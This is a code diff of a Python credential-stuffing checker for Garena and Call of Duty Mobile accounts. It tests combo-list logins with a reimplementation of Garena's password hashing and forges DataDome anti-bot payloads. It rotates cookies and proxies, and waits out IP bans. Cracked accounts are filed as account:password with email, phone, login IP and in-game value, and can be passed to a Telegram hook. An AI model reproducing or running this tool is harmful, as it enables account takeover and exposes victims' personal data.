+        # stat table — separate box inside outer border
+        lines.append(_bord(st_top))
+        for sr in stat_rows:
+            lines.append(_bord(sr))
+        lines.append(_bord(st_bot))
+        # content below: wrapped in │...│
+        for row in ['', prog, '']:
+            lines.append(_bord(row))
+        for row in sec1:
+            lines.append(_bord(row))
+        lines.append(_bord(_lr('', '')))
+        for row in sec2:
+            lines.append(_bord(row))
+        lines.append(_bord(''))
+        lines.append(_bord(bot_content))
+        lines.append(bot_border)
+        lines.append('')
         return '\n'.join(lines)
 
-class Scribe:
+class ResultsManager:
     def __init__(self, combo_file_path, create_dirs=True):
         self.combo_file_name = Path(combo_file_path).stem
         self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
@@ -1147,228 +1332,198 @@ class Scribe:
         if create_dirs:
             for sub in ('Country', 'Level', 'Garena Shells'):
                 (self.base_dir / sub).mkdir(parents=True, exist_ok=True)
-            if other:
+            if CHECK_OTHER_GAMES:
                 (self.base_dir / 'Games').mkdir(parents=True, exist_ok=True)
         self._file_locks = {}
         self._locks_meta = threading.Lock()
         self._counter = 0
         self._counter_lock = threading.Lock()
 
-    def lock_of(self, fp):
+    def _get_flock(self, fp):
         fp = str(fp)
         with self._locks_meta:
             if fp not in self._file_locks:
                 self._file_locks[fp] = threading.Lock()
             return self._file_locks[fp]
 
-    def nxt(self):
+    def _next_index(self):
         with self._counter_lock:
             self._counter += 1
             return self._counter
 
     @staticmethod
-    def level_of(entry):
-        m = re.search('Account Level:\\s*(\\d+)', entry)
+    def _entry_level(entry):
+        import re as _re
+        m = _re.search('Account Level:\\s*(\\d+)', entry)
         return int(m.group(1)) if m else 0
 
     @staticmethod
-    def shell_of(entry):
-        m = re.search('Garena Shell:\\s*(\\d+)', entry)
+    def _entry_shell(entry):
+        import re as _re
+        m = _re.search('Garena Shell:\\s*(\\d+)', entry)
         return int(m.group(1)) if m else 0
 
-    def write_sorted(self, filepath, new_entry_body, sort_by='level'):
+    def _write_sorted(self, filepath, new_entry_body, sort_by='level'):
         filepath = str(filepath)
         os.makedirs(os.path.dirname(filepath), exist_ok=True)
-        with self.lock_of(filepath):
+        with self._get_flock(filepath):
             entries = []
             if os.path.exists(filepath):
                 with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                     content = f.read()
-                raw_entries = content.strip().split('\n' + '-' * 60 + '\n')
+                raw_entries = content.strip().split('\n' + '=' * 60 + '\n')
                 for raw_entry in raw_entries:
                     raw_entry = raw_entry.strip()
                     if raw_entry:
-                        if raw_entry.startswith('-' * 60):
-                            raw_entry = raw_entry[len('-' * 60):].strip()
-                        if raw_entry.endswith('-' * 60):
-                            raw_entry = raw_entry[:-len('-' * 60)].strip()
+                        if raw_entry.startswith('=' * 60):
+                            raw_entry = raw_entry[len('=' * 60):].strip()
+                        if raw_entry.endswith('=' * 60):
+                            raw_entry = raw_entry[:-len('=' * 60)].strip()
                         entries.append(raw_entry)
             new_entry = new_entry_body.strip()
-            if new_entry.startswith('-' * 60):
-                new_entry = new_entry[len('-' * 60):].strip()
-            if new_entry.endswith('-' * 60):
-                new_entry = new_entry[:-len('-' * 60)].strip()
+            if new_entry.startswith('=' * 60):
+                new_entry = new_entry[len('=' * 60):].strip()
+            if new_entry.endswith('=' * 60):
+                new_entry = new_entry[:-len('=' * 60)].strip()
             entries.append(new_entry)
 
             if sort_by == 'shell':
-                entries.sort(key=self.shell_of, reverse=True)
+                entries.sort(key=self._entry_shell, reverse=True)
             else:
-                entries.sort(key=self.level_of, reverse=True)
+                entries.sort(key=self._entry_level, reverse=True)
 
             with open(filepath, 'w', encoding='utf-8', errors='replace') as f:
                 for i, entry in enumerate(entries):
-                    f.write('-' * 60 + '\n')
+                    f.write('=' * 60 + '\n')
                     f.write(entry.strip())
-                    f.write('\n' + '-' * 60)
+                    f.write('\n' + '=' * 60)
                     if i < len(entries) - 1:
                         f.write('\n\n')
 
-    def append(self, filepath, line):
+    def _append_line(self, filepath, line):
         filepath = str(filepath)
-        with self.lock_of(filepath):
+        with self._get_flock(filepath):
             with open(filepath, 'a', encoding='utf-8', errors='replace') as f:
                 f.write(line + '\n')
 
     @staticmethod
-    def ascii_val(val):
+    def _ascii(val):
         if not val or val == 'N/A':
             return val
-        cleaned = ''.join(
-            c for c in str(val) if c >= ' ' or c in '\t'
-        ).strip()
+        cleaned = ''.join((c for c in str(val) if c >= ' ' or c in '\t')).strip()
         return cleaned or 'N/A'
 
-    def server(self, region_code):
+    def _format_server(self, region_code):
         if not region_code or region_code == 'N/A':
             return 'N/A'
-        region_info = regions.get(str(region_code).upper(), {}) if region_code and region_code != 'N/A' else {}
-        return f"{region_info['name']} ({region_code})" if region_info else str(region_code)
+        _region_info = CODM_REGIONS.get(str(region_code).upper(), {}) if region_code and region_code != 'N/A' else {}
+        return f"{_region_info['flag']} {_region_info['name']} ({region_code})" if _region_info else str(region_code)
 
-    def format(self, account_data, index=1):
+    def _format_account(self, account_data, index=1):
         acct = account_data.get('account', 'N/A')
         pwd = account_data.get('password', 'N/A')
         if account_data.get('is_error'):
-            return (
-                '-' * 60
-                + f"\nAccount: {acct} : {pwd}\n"
-                + f"Error: {account_data.get('error_reason', 'Unknown')}\n"
-                + '-' * 60
-            )
+            return '=' * 60 + f"\nAccount: {acct}:{pwd}\nError: {account_data.get('error_reason', 'Unknown')}\n" + '=' * 60
         is_clean = account_data.get('is_clean', False)
         has_codm = account_data.get('has_codm', False)
 
         base_lines = [
-            '=' * 60,
-            f'Account: {acct}:{pwd}',
-            f'UID: {account_data.get("uid", "N/A")}',
-            f'Username: {self.ascii_val(account_data.get("username", "N/A"))}',
+            '=' * 60, f'Account: {acct}:{pwd}', f'UID: {account_data.get("uid", "N/A")}',
+            f'Username: {self._ascii(account_data.get("username", "N/A"))}',
             f'Garena Shell: {account_data.get("shell_balance", 0)}',
             f'Email: {account_data.get("email_display", "N/A")}',
             f'Mobile: {account_data.get("formatted_mobile", "N/A")}',
             f'Country: {account_data.get("country", "N/A")}',
-            f'Nickname: {self.ascii_val(account_data.get("nickname", "N/A"))}',
-            '',
-            '--- Facebook Information ---',
-            f'Facebook Username: {self.ascii_val(account_data.get("fb_username", "N/A"))}',
+            f'Nickname: {self._ascii(account_data.get("nickname", "N/A"))}',
+            '', '--- Facebook Information ---',
+            f'Facebook Username: {self._ascii(account_data.get("fb_username", "N/A"))}',
             f'Facebook Link: {account_data.get("fb_link", "N/A")}',
             f'Facebook Status: {account_data.get("fb_info", "N/A")}',
-            '',
-            '--- Login History ---',
+            '', '--- Login History ---',
             f'Last Login: {account_data.get("last_login_date", "N/A")}',
             f'Last Login From: {account_data.get("last_login_where", "N/A")}',
             f'Last Login IP: {account_data.get("last_login_ip", "N/A")}',
             f'Last Login Country: {account_data.get("last_login_country", "N/A")}',
-            '',
-            f'Account Status: {"Clean" if is_clean else "Not Clean"}',
-            '',
-            'Powered by: @dvlist',
-            '=' * 60
+            '', f'Account Status: {("Clean" if is_clean else "Not Clean")}',
+            '', 'Powered by: @Dvlist', '=' * 60
         ]
-
+        
         if not has_codm:
             return '\n'.join(base_lines)
-
+        
         codm_lines = [
             '--- CODM Information ---',
             f'Account Level: {account_data.get("codm_level", "N/A")}',
-            f'Server: {self.server(account_data.get("codm_region", "N/A"))}',
-            f'IGN: {self.ascii_val(account_data.get("codm_nickname", "N/A"))}',
-            f'UID: {account_data.get("codm_uid", account_data.get("uid", "N/A"))}',
-            ''
+            f'Server: {self._format_server(account_data.get("codm_region", "N/A"))}',
+            f'IGN: {self._ascii(account_data.get("codm_nickname", "N/A"))}',
+            f'UID: {account_data.get("codm_uid", account_data.get("uid", "N/A"))}', ''
         ]
-
+        
         login_index = base_lines.index('--- Login History ---')
         final_lines = base_lines[:login_index] + codm_lines + base_lines[login_index:]
         return '\n'.join(final_lines)
 
-    def add(self, account_data):
-        if hook and (not account_data.get('is_error')):
-            threading.Thread(target=hook, args=(account_data,), daemon=True).start()
+    def add_account(self, account_data):
+        if _TG_HOOK and (not account_data.get('is_error')):
+            threading.Thread(target=_TG_HOOK, args=(account_data,), daemon=True).start()
         if account_data.get('is_error'):
             return
         combo = f"{account_data.get('account', '')}:{account_data.get('password', '')}"
-        entry = self.format(account_data, index=self.nxt())
+        entry = self._format_account(account_data, index=self._next_index())
         has_codm = account_data.get('has_codm', False)
         is_clean = account_data.get('is_clean', False)
         shell = int(account_data.get('shell_balance', 0) or 0)
-        timestamp = self.timestamp
 
-        self.write_sorted(self.base_dir / f'All_Accounts_{timestamp}.txt', entry)
-        self.append(self.base_dir / f'Valid_Accounts_{timestamp}.txt', combo)
+        self._write_sorted(self.base_dir / 'All Accounts.txt', entry)
+        self._append_line(self.base_dir / 'Valid Accounts.txt', combo)
 
         if is_clean and has_codm:
-            self.write_sorted(self.base_dir / f'Clean Accounts.txt', entry)
+            self._write_sorted(self.base_dir / 'Clean Accounts.txt', entry)
         elif has_codm:
-            self.write_sorted(self.base_dir / f'Not Clean Accounts.txt', entry)
+            self._write_sorted(self.base_dir / 'Not Clean Accounts.txt', entry)
 
         if not has_codm:
-            self.write_sorted(self.base_dir / f'NO CODM Accounts.txt', entry)
+            self._write_sorted(self.base_dir / 'No CODM Accounts.txt', entry)
             if shell > 0:
-                self.write_sorted(
-                    self.base_dir / 'Garena Shells' / f'NO CODM Shells.txt',
-                    entry,
-                    sort_by='shell'
-                )
+                self._write_sorted(self.base_dir / 'Garena Shells' / 'No CODM Shells.txt', entry, sort_by='shell')
             return
 
         country = str(account_data.get('country', 'XX') or 'XX').strip().upper()
-        self.write_sorted(
-            self.base_dir / 'Country' / f'{country}_Accounts_{timestamp}.txt',
-            entry
-        )
+        self._write_sorted(self.base_dir / 'Country' / f'{country} Accounts.txt', entry)
 
         try:
             lvl = int(account_data.get('codm_level', 0) or 0)
         except (ValueError, TypeError):
             lvl = 0
-        if lvl <= 100:
-            bucket = '1-100.txt'
-        elif lvl <= 200:
-            bucket = '101-200.txt'
-        elif lvl <= 350:
-            bucket = '201-350.txt'
-        else:
-            bucket = '351-450.txt'
-        self.write_sorted(self.base_dir / 'Level' / bucket, entry)
+        bucket = '1-100.txt' if lvl <= 100 else '101-200.txt' if lvl <= 200 else '201-350.txt' if lvl <= 350 else '351-400.txt'
+        self._write_sorted(self.base_dir / 'Level' / bucket, entry)
 
         if shell > 0:
-            self.write_sorted(
-                self.base_dir / 'Garena Shells' / f'CODM Shells.txt',
-                entry,
-                sort_by='shell'
-            )
+            self._write_sorted(self.base_dir / 'Garena Shells' / 'CODM Shells.txt', entry, sort_by='shell')
 
-scrpath = os.path.dirname(os.path.abspath(__file__))
-hook = None
+_SCRIPT_DIR_COOKIE = os.path.dirname(os.path.abspath(__file__))
+_TG_HOOK = None
 
-sessfile = 'cookies.txt'
-proxies = False
-pool = []
-cursor = 0
-poollock = threading.Lock()
 
-seeds = []
-seedlock = threading.Lock()
-seedidx = {'i': 0}
+_SESSION_FILE = 'cookies.txt'
+_PROXIES_ACTIVE = False
+_SESSION_POOL = []
+_SESSION_POOL_INDEX = 0
+_SESSION_POOL_LOCK = threading.Lock()
 
-seedfile = 'seeds.txt'
+_DATADOME_SEEDS = []
+_DATADOME_SEED_LOCK = threading.Lock()
+_DATADOME_SEED_IDX = {'i': 0}
 
-def gather():
-    global seeds
-    collected = []
-    if os.path.exists(seedfile):
+_SEEDS_FILE = 'seeds.txt'
+
+
+def _load_datadome_seeds():
+    global _DATADOME_SEEDS
+    pool = []
+    if os.path.exists(_SEEDS_FILE):
         try:
-            with open(seedfile, 'r', encoding='utf-8', errors='ignore') as f:
+            with open(_SEEDS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                 for line in f:
                     line = line.strip()
                     if not line or line.startswith('#'):
@@ -1379,68 +1534,71 @@ def gather():
                             if piece.startswith('datadome='):
                                 v = piece.split('=', 1)[1].strip()
                                 if v:
-                                    collected.append(v)
+                                    pool.append(v)
                                 break
                     else:
-                        collected.append(line)
+                        pool.append(line)
         except Exception:
             pass
-    with seedlock:
-        seeds = collected
-        seedidx['i'] = 0
-    return len(collected)
+    with _DATADOME_SEED_LOCK:
+        _DATADOME_SEEDS = pool
+        _DATADOME_SEED_IDX['i'] = 0
+    return len(pool)
 
-def cycle():
-    with seedlock:
-        if not seeds:
+
+def _next_datadome_seed():
+    with _DATADOME_SEED_LOCK:
+        if not _DATADOME_SEEDS:
             return None
-        i = seedidx['i']
-        seedidx['i'] = (i + 1) % len(seeds)
-        return seeds[i]
+        i = _DATADOME_SEED_IDX['i']
+        _DATADOME_SEED_IDX['i'] = (i + 1) % len(_DATADOME_SEEDS)
+        return _DATADOME_SEEDS[i]
+_SESSION_MAX_AGE_SECONDS = 6 * 3600
 
-age = 6 * 3600
-uses = 10
-authmode = False
-current = None
-currentuse = 0
+_SESSION_USES_PER_COOKIE = 10
 
-def replenish():
-    global pool, cursor, current, currentuse
-    collected = []
-    if os.path.exists(sessfile):
+_COOKIE_AUTH_MODE = False
+_CURRENT_SESSION       = None
+_CURRENT_SESSION_USES  = 0
+
+
+def _load_session_pool():
+    global _SESSION_POOL, _SESSION_POOL_INDEX, _CURRENT_SESSION, _CURRENT_SESSION_USES
+    pool = []
+    if os.path.exists(_SESSION_FILE):
         try:
-            with open(sessfile, 'r', encoding='utf-8', errors='ignore') as f:
+            with open(_SESSION_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                 for line in f:
                     line = line.strip()
                     if not line or line.startswith('#'):
                         continue
-                    collected.append(line)
+                    pool.append(line)
         except Exception:
             pass
-    with poollock:
-        pool = collected
-        cursor = 0
-        current = None
-        currentuse = 0
-    return len(collected)
+    with _SESSION_POOL_LOCK:
+        _SESSION_POOL = pool
+        _SESSION_POOL_INDEX = 0
+        _CURRENT_SESSION = None
+        _CURRENT_SESSION_USES = 0
+    return len(pool)
 
-def reindex():
-    return replenish()
 
-def capture(session, session_key):
+def _load_session_index():
+    return _load_session_pool()
+
+
+def _capture_ac_session(session, session_key):
     if not session_key:
         return ''
     try:
         r = session.get(
             f'https://account.garena.com/?session_key={session_key}',
             headers={
-                'user-agent': (
-                    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
-                    '(KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36'
-                ),
+                'user-agent': ('Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
+                               '(KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36'),
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             },
-            timeout=20, allow_redirects=True,
+            timeout=6, allow_redirects=True,
         )
         ac = r.cookies.get('ac_session') or session.cookies.get('ac_session')
         if ac:
@@ -1449,28 +1607,30 @@ def capture(session, session_key):
     except Exception:
         return ''
 
-def acquire():
-    global cursor, current, currentuse
-    with poollock:
-        if not pool:
+
+def _get_any_session():
+    global _SESSION_POOL_INDEX, _CURRENT_SESSION, _CURRENT_SESSION_USES
+    with _SESSION_POOL_LOCK:
+        if not _SESSION_POOL:
             return None
 
-        if current and currentuse < uses:
-            currentuse += 1
-            return current
+        if _CURRENT_SESSION and _CURRENT_SESSION_USES < _SESSION_USES_PER_COOKIE:
+            _CURRENT_SESSION_USES += 1
+            return _CURRENT_SESSION
 
-        if cursor >= len(pool):
-            cursor = 0
+        if _SESSION_POOL_INDEX >= len(_SESSION_POOL):
+            _SESSION_POOL_INDEX = 0
 
-        current = pool[cursor]
-        currentuse = 1
-        cursor += 1
-        return current
+        _CURRENT_SESSION      = _SESSION_POOL[_SESSION_POOL_INDEX]
+        _CURRENT_SESSION_USES = 1
+        _SESSION_POOL_INDEX  += 1
+        return _CURRENT_SESSION
 
-def route(account):
-    return acquire()
+def _get_session_for(account):
+    return _get_any_session()
 
-def bind(session, datadome_manager, session_entry):
+
+def _apply_session_to(session, datadome_manager, session_entry):
     if not session_entry:
         return False
     cookie_str = ''
@@ -1481,12 +1641,13 @@ def bind(session, datadome_manager, session_entry):
     if not cookie_str:
         return False
     try:
-        instill(session, cookie_str)
+        applyck(session, cookie_str)
         return True
     except Exception:
         return False
 
-class Relay:
+
+class ProxyManager:
     def __init__(self, enabled=True, fallback_url=None, proxy_file="proxies.txt"):
         self.enabled = enabled
         self.proxies = []
@@ -1496,10 +1657,10 @@ class Relay:
         self._health = {}
         self._max_fails = 5
         self._cooldown_seconds = 300
-
+        
         if not enabled:
             return
-
+            
         if fallback_url:
             self.proxies = [fallback_url]
         elif proxy_file and Path(proxy_file).exists():
@@ -1508,39 +1669,33 @@ class Relay:
     def _load_from_file(self, proxy_file):
         with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
             for line in f:
-                url = interpret(line)
+                url = _parse_proxy_line(line)
                 if url:
                     self.proxies.append(url)
 
-    def _key(self, proxy_str):
+    def _proxy_key(self, proxy_str):
         return proxy_str or '__direct__'
 
-    def okay(self, proxy_url):
+    def report_success(self, proxy_url):
         if not self.enabled:
             return
         with self._lock:
-            key = self._key(proxy_url)
-            entry = self._health.setdefault(
-                key,
-                {'fails': 0, 'success': 0, 'cooldown_until': 0}
-            )
+            key = self._proxy_key(proxy_url)
+            entry = self._health.setdefault(key, {'fails': 0, 'success': 0, 'cooldown_until': 0})
             entry['success'] += 1
 
-    def fault(self, proxy_url, is_403=False):
+    def report_failure(self, proxy_url, is_403=False):
         if not self.enabled:
             return
         with self._lock:
-            key = self._key(proxy_url)
-            entry = self._health.setdefault(
-                key,
-                {'fails': 0, 'success': 0, 'cooldown_until': 0}
-            )
+            key = self._proxy_key(proxy_url)
+            entry = self._health.setdefault(key, {'fails': 0, 'success': 0, 'cooldown_until': 0})
             entry['fails'] += 1
             if is_403 or entry['fails'] >= self._max_fails:
                 entry['cooldown_until'] = time.time() + self._cooldown_seconds
                 entry['fails'] = 0
 
-    def next(self):
+    def get_next(self):
         if not self.enabled or not self.proxies:
             return None
         with self._lock:
@@ -1548,10 +1703,7 @@ class Relay:
             for _ in range(len(self.proxies)):
                 proxy = self.proxies[self._index % len(self.proxies)]
                 self._index += 1
-                entry = self._health.get(
-                    self._key(proxy),
-                    {'cooldown_until': 0}
-                )
+                entry = self._health.get(self._proxy_key(proxy), {'cooldown_until': 0})
                 if entry.get('cooldown_until', 0) < now:
                     self._counter += 1
                     return {'http': proxy, 'https': proxy}
@@ -1560,13 +1712,13 @@ class Relay:
             self._counter += 1
             return {'http': proxy, 'https': proxy}
 
-    def ready(self):
+    def is_loaded(self):
         return self.enabled and len(self.proxies) > 0
 
-    def count(self):
+    def get_count(self):
         return len(self.proxies)
 
-def pluck(cookie_str):
+def extract_datadome_token(cookie_str):
     if not cookie_str:
         return ''
     val = cookie_str.strip()
@@ -1580,42 +1732,35 @@ def pluck(cookie_str):
         return val.split('=', 1)[1].strip()
     return val
 
-class Jar:
+class CookieManager:
 
     def __init__(self):
-        self.banned = set()
-        self.live = []
+        self.banned_cookies = set()
+        self.live_cookies = []
         self.lock = threading.Lock()
-        self._load_banned()
-        self._load_initial()
+        self.load_banned_cookies()
+        self.load_initial_cookies()
 
-    def _load_banned(self):
+    def load_banned_cookies(self):
         if os.path.exists('banned_cookies.txt'):
             try:
                 with open('banned_cookies.txt', 'r', encoding='utf-8', errors='ignore') as f:
-                    self.banned = set(line.strip() for line in f if line.strip())
+                    self.banned_cookies = set((line.strip() for line in f if line.strip()))
             except Exception:
                 pass
 
-    def _extract(self, cookie_str):
-        return pluck(cookie_str)
+    def _extract_dd(self, cookie_str):
+        return extract_datadome_token(cookie_str)
 
-    def banned_p(self, cookie):
-        dd = self._extract(cookie)
-        return (
-            (cookie in self.banned)
-            or (dd in self.banned)
-            or (f'datadome={dd}' in self.banned)
-        )
+    def is_banned(self, cookie):
+        dd = self._extract_dd(cookie)
+        return (cookie in self.banned_cookies) or (dd in self.banned_cookies) or (f'datadome={dd}' in self.banned_cookies)
 
-    def _load_initial(self):
+    def load_initial_cookies(self):
         cookie_file = 'fresh_cookie.txt'
         if not os.path.exists(cookie_file):
             import glob as _glob
-            candidates = (
-                sorted(_glob.glob('fresh_cookie*.txt'))
-                + sorted(_glob.glob('seeds*.txt'))
-            )
+            candidates = sorted(_glob.glob('fresh_cookie*.txt')) + sorted(_glob.glob('seeds*.txt'))
             if candidates:
                 cookie_file = candidates[0]
         if os.path.exists(cookie_file):
@@ -1623,79 +1768,74 @@ class Jar:
                 with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as f:
                     for line in f:
                         cookie = line.strip()
-                        if cookie and not self.banned_p(cookie):
-                            self.live.append(cookie)
+                        if cookie and not self.is_banned(cookie):
+                            self.live_cookies.append(cookie)
             except Exception:
                 pass
 
-    def ban(self, cookie_value):
+    def mark_banned(self, cookie_value):
         if not cookie_value:
             return
-        dd = self._extract(cookie_value)
-        formatted = f'datadome={dd}' if dd else cookie_value
+        dd = self._extract_dd(cookie_value)
+        formatted_cookie = f'datadome={dd}' if dd else cookie_value
         with self.lock:
-            if self.live:
-                self.live = [
-                    ck for ck in self.live
-                    if self._extract(ck) != dd
-                    and ck != formatted
-                    and ck != cookie_value
-                ]
-            if formatted not in self.banned:
-                self.banned.add(formatted)
+            if self.live_cookies:
+                self.live_cookies = [ck for ck in self.live_cookies if self._extract_dd(ck) != dd and ck != formatted_cookie and ck != cookie_value]
+            if formatted_cookie not in self.banned_cookies:
+                self.banned_cookies.add(formatted_cookie)
                 if dd:
-                    self.banned.add(dd)
-                self._append('banned_cookies.txt', formatted)
+                    self.banned_cookies.add(dd)
+                self._append_to_file('banned_cookies.txt', formatted_cookie)
 
-    def pick(self):
+    def pick_cookie(self):
         with self.lock:
-            if not self.live:
+            if not self.live_cookies:
                 return None
-            return random.choice(self.live)
+            return random.choice(self.live_cookies)
 
-    def valids(self):
+    def get_valid_cookies(self):
         with self.lock:
-            if not self.live:
+            if not self.live_cookies:
                 return []
-            return random.sample(self.live, min(5, len(self.live)))
+            return random.sample(self.live_cookies, min(5, len(self.live_cookies)))
 
-    def keep(self, datadome_value):
+    def save_cookie(self, datadome_value):
         if not datadome_value:
             return False
         val = datadome_value.strip()
-        formatted = val if val.startswith('datadome=') else f'datadome={val}'
+        formatted_cookie = val if val.startswith('datadome=') else f'datadome={val}'
         with self.lock:
-            if formatted not in self.banned and formatted not in self.live:
-                self.live.append(formatted)
-                self._append('fresh_cookie.txt', formatted)
+            if formatted_cookie not in self.banned_cookies and formatted_cookie not in self.live_cookies:
+                self.live_cookies.append(formatted_cookie)
+                self._append_to_file('fresh_cookie.txt', formatted_cookie)
                 return True
         return False
 
-    def _append(self, filename, content):
+    def _append_to_file(self, filename, content):
         try:
             with open(filename, 'a', encoding='utf-8') as f:
                 f.write(content + '\n')
         except Exception:
             pass
 
-def seal(plaintext, key):
-    k = bytes.fromhex(key)
-    pt = bytes.fromhex(plaintext)
-    box = AES.new(k, AES.MODE_ECB)
-    ct = box.encrypt(pt)
-    return ct.hex()[:32]
+def encode(plaintext, key):
+    key = bytes.fromhex(key)
+    plaintext = bytes.fromhex(plaintext)
+    cipher = AES.new(key, AES.MODE_ECB)
+    ciphertext = cipher.encrypt(plaintext)
+    return ciphertext.hex()[:32]
 
-def digest(password):
-    decoded = urllib.parse.unquote(password)
-    return hashlib.md5(decoded.encode('utf-8')).hexdigest()
+def get_passmd5(password):
+    decoded_password = urllib.parse.unquote(password)
+    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()
 
-def cipher(password, v1, v2):
-    passmd5 = digest(password)
-    inner = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
-    outer = hashlib.sha256((inner + v2).encode()).hexdigest()
-    return seal(passmd5, outer)
+def hash_password(password, v1, v2):
+    passmd5 = get_passmd5(password)
+    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
+    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
+    return encode(passmd5, outer_hash)
 
-def instill(session, cookie_str):
+def applyck(session, cookie_str):
     session.cookies.clear()
     if not cookie_str:
         return
@@ -1734,29 +1874,24 @@ def instill(session, cookie_str):
         else:
             session.cookies.set(k, v, domain='.garena.com')
 
-ipwaitlock = threading.Lock()
-ipactive = False
-ipevent = threading.Event()
-ipsilent = False
-ipcallback = None
+_ip_wait_lock = threading.Lock()
+_ip_wait_active = False
+_ip_wait_event = threading.Event()
+_suppress_ip_prints = False
+_ip_block_callback = None
 
-def persist(session):
+def _save_session_cookies(session):
     return False
 
-def seed(session):
+def init_ga_cookies(session):
     timestamp = int(time.time())
     random_id = random.randint(1000000000, 9999999999)
-    ga_cookies = {
-        '_ga': f'GA1.1.{random_id}.{timestamp}',
-        '_ga_XB5PSHEQB4': f'GS2.1.s{timestamp}$o1$g0$t{timestamp}$j53$l0$h0',
-        '_ga_1M7M9L6VPX': f'GS2.1.s{timestamp}$o6$g0$t{timestamp}$j60$l0$h0',
-        '_gid': f'GA1.2.{random.randint(100000000, 999999999)}.{timestamp}'
-    }
+    ga_cookies = {'_ga': f'GA1.1.{random_id}.{timestamp}', '_ga_XB5PSHEQB4': f'GS2.1.s{timestamp}$o1$g0$t{timestamp}$j53$l0$h0', '_ga_1M7M9L6VPX': f'GS2.1.s{timestamp}$o6$g0$t{timestamp}$j60$l0$h0'}
     for name, value in ga_cookies.items():
         session.cookies.set(name, value, domain='.garena.com')
     return ga_cookies
 
-class Weaver:
+class DataDomeGenerator:
 
     def init(self, key: str, cookie: str):
         self.key = key
@@ -1785,7 +1920,7 @@ class Weaver:
         a = True
         u = None
 
-        def generator(get_val: bool = False) -> int:
+        def generator(get_val: bool=False) -> int:
             nonlocal e, i, r, a, u
             if u is not None:
                 t = u
@@ -1814,13 +1949,11 @@ class Weaver:
             return 46 + n
         return 50 * n + 45
 
-    def generate_payload(self, data: dict[str, any], timestamp: int) -> str:
+    def generate_payload(self, data: Dict[str, Any], timestamp: int) -> str:
         seed_from_cookie = self._hash_str_to_int(self.cookie)
         initial_seed = self.t ^ seed_from_cookie ^ self._hash_str_to_int(self.key)
-        e = self._prng_h(
-            self._prng_h((timestamp >> 3 ^ 11027890091) * self.t)
-        )
-        ks_a = self._create_keystream_generator(initial_seed, e)
+        e = self._prng_h(self._prng_h((timestamp >> 3 ^ 11027890091) * self.t))
+        keystream_gen_a = self._create_keystream_generator(initial_seed, e)
         payload_bytes = []
         is_first = True
 
@@ -1831,23 +1964,20 @@ class Weaver:
             buffer = s.encode('utf-8')
             encrypted = []
             for byte in buffer:
-                encrypted.append(byte ^ ks_a())
+                encrypted.append(byte ^ keystream_gen_a())
             return encrypted
         for key, value in data.items():
             if not is_first:
-                payload_bytes.append(ks_a() ^ 44)
+                payload_bytes.append(keystream_gen_a() ^ 44)
             key_bytes = encrypt_str(stringify(key))
             value_bytes = encrypt_str(stringify(value))
             payload_bytes.extend(key_bytes)
-            payload_bytes.append(ks_a() ^ 58)
+            payload_bytes.append(keystream_gen_a() ^ 58)
             payload_bytes.extend(value_bytes)
             is_first = False
-        ks_b = self._create_keystream_generator(
-            1809053797 ^ self._hash_str_to_int(self.cookie),
-            e
-        )
-        final_bytes = [byte ^ ks_b() for byte in payload_bytes]
-        final_bytes.append(ks_a(True) ^ 125 ^ ks_b())
+        keystream_gen_b = self._create_keystream_generator(1809053797 ^ self._hash_str_to_int(self.cookie), e)
+        final_bytes = [byte ^ keystream_gen_b() for byte in payload_bytes]
+        final_bytes.append(keystream_gen_a(True) ^ 125 ^ keystream_gen_b())
         result_chars = []
         w = 0
         b = e
@@ -1871,14 +2001,14 @@ class Weaver:
             return ''.join(result_chars[:-(3 - padding)])
         return ''.join(result_chars)
 
-class Warden:
+class DataDomeManager:
     def __init__(self):
         self.current_datadome = None
         self.datadome_history = []
         self._403_attempts = 0
         self._local_lock = threading.Lock()
         self._local_request_count = 0
-        self._local_max_requests = 250
+        self._local_max_requests = 800
 
     def set_datadome(self, datadome_cookie):
         if datadome_cookie and datadome_cookie != self.current_datadome:
@@ -1935,12 +2065,7 @@ class Warden:
             return False
 
     def get_current_ip(self):
-        ip_services = [
-            'https://api.ipify.org',
-            'https://icanhazip.com',
-            'https://ident.me',
-            'https://checkip.amazonaws.com'
-        ]
+        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
         for service in ip_services:
             try:
                 response = requests.get(service, timeout=8)
@@ -1953,103 +2078,70 @@ class Warden:
         return None
 
     def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
-        global ipwaitlock, ipactive, ipevent, proxies
-        if proxies:
+        global _ip_wait_lock, _ip_wait_active, _ip_wait_event, _PROXIES_ACTIVE
+        if _PROXIES_ACTIVE:
             return False
-        with ipwaitlock:
-            if ipactive:
+        with _ip_wait_lock:
+            if _ip_wait_active:
                 is_primary = False
             else:
-                ipactive = True
-                ipevent.clear()
+                _ip_wait_active = True
+                _ip_wait_event.clear()
                 is_primary = True
         if not is_primary:
-            ipevent.wait(timeout=max_wait_time + 30)
+            _ip_wait_event.wait(timeout=max_wait_time + 30)
             return True
         try:
             original_ip = self.get_current_ip()
             if not original_ip:
-                if not ipsilent:
-                    herald('WARNING', 'IP BLOCKED — could not detect IP, waiting 10s')
-                if ipcallback:
-                    ipcallback(True)
+                if not _suppress_ip_prints:
+                    _log('WARNING', 'IP BLOCKED — could not detect IP, waiting 10s')
+                if _ip_block_callback:
+                    _ip_block_callback(True)
                 time.sleep(10)
-                if ipcallback:
-                    ipcallback(False)
+                if _ip_block_callback:
+                    _ip_block_callback(False)
                 return True
-            if not ipsilent:
-                herald('ERROR', f'IP BLOCKED — [bold]{original_ip}[/bold]')
-                herald('WARNING', 'Change your IP now — VPN / Mobile Data / Airplane Mode')
-            if ipcallback:
-                ipcallback(True)
+            if not _suppress_ip_prints:
